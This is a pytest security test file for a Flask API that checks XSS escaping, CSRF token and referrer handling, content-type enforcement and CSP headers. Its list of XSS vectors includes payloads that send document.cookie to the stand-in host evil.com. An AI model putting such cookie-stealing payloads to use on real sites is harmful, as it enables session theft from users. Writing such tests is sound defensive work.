import pytest
from flask import Flask
from app import create_app, db
from app.models import User
from app.tests.factories import UserFactory

class TestSecurityXSSCSRF:
    """Test XSS and CSRF protection"""
    
    @pytest.fixture
    def app(self):
        app = create_app('testing')
        app.config['WTF_CSRF_ENABLED'] = True
        with app.app_context():
            db.create_all()
            yield app
            db.session.remove()
            db.drop_all()
    
    @pytest.fixture
    def client(self, app):
        return app.test_client()
    
    @pytest.fixture
    def auth_headers(self, client):
        user = UserFactory(role='trainer')
        db.session.commit()
        
        response = client.post('/api/v1/auth/login', json={
            'email': user.email,
            'password': 'password123'
        })
        token = response.json['access_token']
        
        return {'Authorization': f'Bearer {token}'}
    
    def test_xss_in_user_input(self, client, auth_headers):
        """Test XSS prevention in user inputs"""
        xss_vectors = [
            '<script>alert(document.cookie)</script>',
            '<img src=x onerror=this.src="http://evil.com/steal?c="+document.cookie>',
            '<svg/onload=fetch("http://evil.com/steal?c="+document.cookie)>',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<button onclick=alert("XSS")>Click</button>',
            '<form action="javascript:alert(\'XSS\')">',
        ]
        
        for vector in xss_vectors:
            # Test in different fields
            response = client.put(f'/api/v1/users/profile', json={
                'first_name': vector,
                'bio': vector,
                'title': vector
            }, headers=auth_headers)
            
            if response.status_code == 200:
                data = response.json
                # Ensure script tags are escaped or removed
                assert '<script>' not in data.get('first_name', '')
                assert 'javascript:' not in data.get('bio', '')
                assert 'onerror=' not in data.get('title', '')
    
    def test_stored_xss_prevention(self, client, auth_headers):
        """Test prevention of stored XSS attacks"""
        # Create content with XSS
        response = client.post('/api/v1/messages', json={
            'recipient_id': 2,
            'content': '<script>alert("Stored XSS")</script>Hello'
        }, headers=auth_headers)
        
        message_id = response.json.get('id')
        
        # Retrieve the message
        response = client.get(f'/api/v1/messages/{message_id}', headers=auth_headers)
        
        # Script should be escaped or sanitized
        assert '<script>' not in response.json['content']
    
    def test_reflected_xss_prevention(self, client, auth_headers):
        """Test prevention of reflected XSS attacks"""
        xss_params = [
            '"><script>alert("XSS")</script>',
            '\'><script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            'data:text/html,<script>alert("XSS")</script>',
        ]
        
        for param in xss_params:
            response = client.get(
                f'/api/v1/search?q={param}',
                headers=auth_headers
            )
            
            # Response should not reflect unescaped input
            if response.status_code == 200:
                response_text = response.get_data(as_text=True)
                assert '<script>' not in response_text
                assert 'javascript:' not in response_text
    
    def test_dom_xss_prevention(self, client, auth_headers):
        """Test prevention of DOM-based XSS"""
        # Test URL fragments that might be used in JavaScript
        dangerous_fragments = [
            '#<img src=x onerror=alert("XSS")>',
            '#javascript:alert("XSS")',
            '#"><script>alert("XSS")</script>',
        ]
        
        for fragment in dangerous_fragments:
            response = client.get(
                f'/api/v1/dashboard{fragment}',
                headers=auth_headers
            )
            
            # Ensure the response doesn't include unescaped fragments
            response_text = response.get_data(as_text=True)
            assert '<script>' not in response_text
    
    def test_csrf_token_validation(self, client, auth_headers):
        """Test CSRF token validation"""
        # Get CSRF token
        response = client.get('/api/v1/csrf-token', headers=auth_headers)
        csrf_token = response.json.get('csrf_token')
        
        # Test POST without CSRF token
        response = client.post('/api/v1/beneficiaries', 
                             json={'name': 'Test'},
                             headers=auth_headers)
        
        # Should require CSRF token for state-changing operations
        # Note: This might not apply if using JWT for CSRF protection
        if client.application.config.get('WTF_CSRF_ENABLED'):
            assert response.status_code in [400, 403]
    
    def test_csrf_referrer_validation(self, client, auth_headers):
        """Test CSRF referrer validation"""
        # Test with invalid referrer
        headers = {
            **auth_headers,
            'Referer': 'http://evil.com'
        }
        
        response = client.post('/api/v1/beneficiaries',
                             json={'name': 'Test'},
                             headers=headers)
        
        # Should validate referrer for sensitive operations
        # Response depends on implementation
        assert response.status_code in [200, 201, 400, 403]
    
    def test_csrf_double_submit_cookie(self, client, auth_headers):
        """Test CSRF double submit cookie pattern"""
        # Set CSRF cookie
        client.set_cookie('localhost', 'csrf_token', 'test_token')
        
        # Submit with matching header
        headers = {
            **auth_headers,
            'X-CSRF-Token': 'test_token'
        }
        
        response = client.post('/api/v1/beneficiaries',
                             json={'name': 'Test'},
                             headers=headers)
        
        # Should accept matching cookie and header
        assert response.status_code in [200, 201]
        
        # Submit with non-matching header
        headers['X-CSRF-Token'] = 'wrong_token'
        response = client.post('/api/v1/beneficiaries',
                             json={'name': 'Test'},
                             headers=headers)
        
        # Should reject non-matching tokens
        if client.application.config.get('WTF_CSRF_ENABLED'):
            assert response.status_code in [400, 403]
    
    def test_content_type_validation(self, client, auth_headers):
        """Test content type validation to prevent XSS"""
        # Test with dangerous content types
        dangerous_types = [
            'text/html',
            'application/xhtml+xml',
            'application/xml',
        ]
        
        for content_type in dangerous_types:
            headers = {
                **auth_headers,
                'Content-Type': content_type
            }
            
            response = client.post('/api/v1/messages',
                                 data='<script>alert("XSS")</script>',
                                 headers=headers)
            
            # Should not accept HTML/XML content types for JSON APIs
            assert response.status_code in [400, 415]
    
    def test_json_content_type_enforcement(self, client, auth_headers):
        """Test JSON content type enforcement"""
        # Send JSON data with wrong content type
        response = client.post('/api/v1/beneficiaries',
                             data='{"name": "Test"}',
                             headers={**auth_headers, 'Content-Type': 'text/plain'})
        
        # Should require proper content type
        assert response.status_code in [400, 415]
    
    def test_output_encoding(self, client, auth_headers):
        """Test proper output encoding"""
        # Create data with special characters
        special_chars = '<>&"\'\n\r\t'
        
        response = client.post('/api/v1/notes', json={
            'content': special_chars
        }, headers=auth_headers)
        
        note_id = response.json.get('id')
        
        # Retrieve and check encoding
        response = client.get(f'/api/v1/notes/{note_id}', headers=auth_headers)
        
        # Characters should be properly encoded
        content = response.json['content']
        assert content == special_chars  # Should preserve but encode when rendered
    
    def test_csp_headers(self, client, auth_headers):
        """Test Content Security Policy headers"""
        response = client.get('/api/v1/dashboard', headers=auth_headers)
        
        # Should have CSP headers
        csp = response.headers.get('Content-Security-Policy')
        if csp:
            assert "script-src" in csp
            assert "default-src" in csp
            assert "unsafe-inline" not in csp or "nonce-" in csp